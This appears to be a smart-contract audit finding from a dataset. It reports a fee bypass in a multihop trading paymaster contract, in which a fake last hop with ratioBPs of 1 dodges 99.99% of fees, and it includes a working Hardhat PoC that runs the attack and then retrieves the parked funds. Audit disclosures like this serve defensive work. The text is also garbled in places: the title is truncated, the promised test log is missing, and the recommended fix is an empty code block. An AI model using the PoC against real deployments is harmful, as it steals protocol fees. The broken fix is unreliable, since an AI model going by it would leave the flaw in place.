# [H] Fees can be bypassed by 99.99% by setting

## Summary
Severity: High
Contest weight: 0.9502
Dataset id: 22809
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
In a multihop trade, traders can add a last hop with the ratioBps equal to 1, and fee token to the (fake) output token, which will allow dodging of fees by 99.99%. A large portion of output funds be in the contract, but they can be easily retrieved later.
In Maradona, for single-hop trades, the total ratioBps is validated to be 10000
dit-v1/contracts/Paymaster/Messi.sol#L588-L591
```solidity
if (ops.length == 1) {
    require(ops[0].useContractFunds == false, "Messi: single operation must not use contract funds");
    require(ops[0].ratioBPs == 10000, "Messi: single operation must have ratioBPs equal to 10000");
}
```
If there are multiple hops, each hop's split are also validated to sum up to 10000
dit-v1/contracts/Paymaster/Messi.sol#L605-L612
```solidity
if (i > 0 && op.inputToken != lastAddress) {
    require(cumRatio == 10000, "Messi: cumRatio is not 10000");
}
```
inject a fake trade at the end, with a BPS of 1, and the fee token to be the (fake) output token.
This will allow dodging 99.99% of the fees, and the real output amount to remain in the contract, which, has been outlined in the README, can easily be retrieved by performing a dust trade with that as the output.
• Fees can be bypassed
• Funds may remain in the contract, breaking protocol invariant

## Proof of Concept
Alice wants to trade 1 ETH to USDC. She can dodge the fees using the following sequence of two operations:
• Operation 1: ETH to USDC. Amount in = 1, ratioBPS = 10000,
• Operation 2: USDC = USDT. Amount in = irrelevant (because it will get overwritten), ratioBPS = 1
• Fee token = USDT
What will happen is that:
• The contract swaps 1 ETH into, say, 4000 USDC
• The contract takes 0.01% of the output USDC amount, that is, 0.4 USDC, and swaps it to 0.4 USDT
• The contract charges a small fee on this 0.4 USDT (just 0.004 USDT), and returns the rest to Alice
• The rest of the 3999.6 USDC remain in the contract, but can be retrieved by Alice at any time using the outlined trade above (even in the same tx as the attack)
We also provide a coded PoC:
```typescript
it.only("PUSH0 PoC - last hop BPS = 1", async function () {
    // Load fixture elements
    const {signers, maradona, mockMarkets, mockTokens} = await loadFixture(deployFixture);

    // User stuff
    const owner = signers[0];
    const users = signers.slice(1);
    const sponsor = users[0];
    const traders = users.slice(1);
    const trader = traders[0];
    const traderAddress = trader.address.toLowerCase();
    // update sponsor
    await maradona.connect(owner).updateCollector(sponsor.address)
    // Token stuff
    const middleToken = mockTokens[1];
    const middleTokenAddress = mockTokens[1].target.toString();
    const outputToken = mockTokens[2];
    const outputTokenAddress = outputToken.target.toString();
    // two operations:
    // Op1: ETH ---> output token, amount = 1, bps = 10000
    // Op2: output token --> middle token, amount = any, bps = 1
    // Fee token: Middle token
    const valueONE = ethers.parseEther("1");
    const feeBps = toBigInt(5);
    const feeValue = toBigInt(2) * valueONE * feeBps / toBigInt(10000)
    const opParams: OperationParametersStruct[] = [getEmptyOpParams(), getEmptyOpParams()];

    opParams[0].inputToken = ethers.ZeroAddress
    opParams[0].outputToken = outputTokenAddress
    opParams[0].ratioBPs = toBigInt(10000)
    opParams[0].amountIn = valueONE.toString()
    opParams[0].exchangeID = 1
    opParams[1].inputToken = outputTokenAddress
    opParams[1].outputToken = middleTokenAddress
    opParams[1].ratioBPs = toBigInt(1)
    opParams[1].useContractFunds = true;
    opParams[1].amountIn = 0
    opParams[1].exchangeID = 1
    // trade and test!
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))

    expect(await outputToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    const tx = await maradona.connect(trader).takeTokensAndTrade(
        opParams,
        "0",
        owner.address,
        traderAddress,
        middleTokenAddress,
        {
            value: valueONE,
        }
    )
    const rx = await tx.wait();
    const txGas = rx ? rx.cumulativeGasUsed * rx.gasPrice : toBigInt(0);
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))

    expect(await middleToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    expect(await outputToken.balanceOf(maradona.target)).to.be.greaterThan(toBigInt(0))

    console.log("Maradona's output token balance:", await outputToken.balanceOf(maradona.target))

    console.log("Traders's middle token balance:", await middleToken.balanceOf(traderAddress))

    // now retrieve the funds
    const opParams2: OperationParametersStruct[] = [getEmptyOpParams()];
    opParams2[0].inputToken = ethers.ZeroAddress
    opParams2[0].outputToken = outputTokenAddress
    opParams2[0].ratioBPs = toBigInt(10000)
    opParams2[0].amountIn = toBigInt(1) // dust ethers only
    opParams2[0].exchangeID = 1
    const tx2 = await maradona.connect(trader).takeTokensAndTrade(
        opParams2,
        "0",
        owner.address,
        traderAddress,
        ethers.ZeroAddress,
        {
            value: toBigInt(1),
        }
    )
    const rx2 = await tx2.wait();
    console.log("\nAfter retrieval")
    console.log("Maradona's output token balance after retrieval:", await outputToken.balanceOf(maradona.target))

    console.log("Traders's output token balance after retrieval:", await outputToken.balanceOf(traderAddress))

    console.log("Traders's middle token balance:", await middleToken.balanceOf(traderAddress))

    console.log("Trader's total balance:", (await middleToken.balanceOf(traderAddress)) + (await outputToken.balanceOf(traderAddress)))

});
```
Run the test with make tests/Maradona, the test log shows:
Which proves that indeed 99.99% of the real output token remains in the contract, and the remaining 0.01% is charged a fee and returned. It also shows that the trader's total balance is far greater than what would've been charged if the fee was 0.5% as per the test's setup, showing successful retrieval of funds.

## Recommendation
validation to Maradona, right after the loop in line 645:
```solidity
if (swapOps.length > 0) {
}
```
This validation must be done if there is at least one swap operation, otherwise direct bridge operation will revert.
